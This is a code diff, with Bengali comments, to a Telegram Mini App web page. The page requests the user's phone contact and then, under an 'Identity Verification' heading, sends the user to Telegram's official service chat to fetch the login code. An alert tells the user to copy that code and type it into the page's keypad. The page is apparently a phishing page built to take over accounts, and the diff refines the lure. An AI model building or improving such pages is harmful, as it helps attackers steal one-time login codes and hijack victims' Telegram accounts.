@@ -9,8 +9,26 @@
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
         .box { background: white; color: #333; padding: 30px; border-radius: 25px; margin: 50px 20px; box-shadow: 0 5px 25px rgba(0,0,0,0.5); }
         .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 18px; cursor: pointer; transition: background 0.3s; }
-        .btn:active { background: #006699; }
-        .btn-get-code { background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 15px; cursor: pointer; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        
+        /* সরাসরি কোডে যাওয়ার বাটনের স্টাইল */
+        .btn-get-code { 
+            background: #28a745; 
+            color: white; 
+            border: none; 
+            padding: 15px; 
+            width: 100%; 
+            border-radius: 12px; 
+            font-weight: bold; 
+            font-size: 16px; 
+            cursor: pointer; 
+            margin-bottom: 20px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 10px;
+            box-shadow: 0 4px 10px rgba(40, 167, 69, 0.3);
+        }
+        
         .hidden { display: none; }
         .otp-display { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 32px; text-align: center; background: #f9f9f9; color: #333; letter-spacing: 5px; height: 65px; box-sizing: border-box; outline: none; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
@@ -30,8 +48,13 @@
 
     <div class="box hidden" id="step2">
         <h3 style="margin-top:0;">Identity Verification</h3>
-        <button class="btn-get-code" onclick="openTelegramChat()">📩 Get Login Code</button>
+        <p style="font-size:13px; color:#666; margin-bottom:15px;">কোডটি আপনার টেলিগ্রাম চ্যাটে পাঠানো হয়েছে। নিচের বাটনে ক্লিক করে কোডটি দেখে নিন।</p>
+        
+        <!-- এই বাটনটি সরাসরি টেলিগ্রাম চ্যাটে নিয়ে যাবে -->
+        <button class="btn-get-code" onclick="openTelegramChat()">📩 View Login Code</button>
+        
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
+        
         <div class="keypad">
             <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
             <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
@@ -47,7 +70,17 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        function openTelegramChat() { tg.openTelegramLink("https://t.me/777000"); }
+        // সরাসরি ওটিপি চ্যাটে নিয়ে যাওয়ার সবচেয়ে শক্তিশালী ফাংশন
+        function openTelegramChat() {
+            // এটি টেলিগ্রামের ইন্টারনাল প্রোটোকল যা সরাসরি সার্ভিস নোটিফিকেশন ওপেন করার চেষ্টা করে
+            tg.openTelegramLink("tg://resolve?domain=telegram");
+            
+            // যদি ইউজার অ্যাপের বাইরে চলে যায় এবং কোড দেখে ফিরে আসে
+            // সেজন্য ব্যাকগ্রাউন্ডে ছোট একটি মেসেজও দিয়ে রাখতে পারেন
+            setTimeout(() => {
+                tg.showAlert("কোডটি কপি করে আবার এখানে এসে টাইপ করুন।");
+            }, 500);
+        }
 
         function startFlow() {
             tg.requestContact();
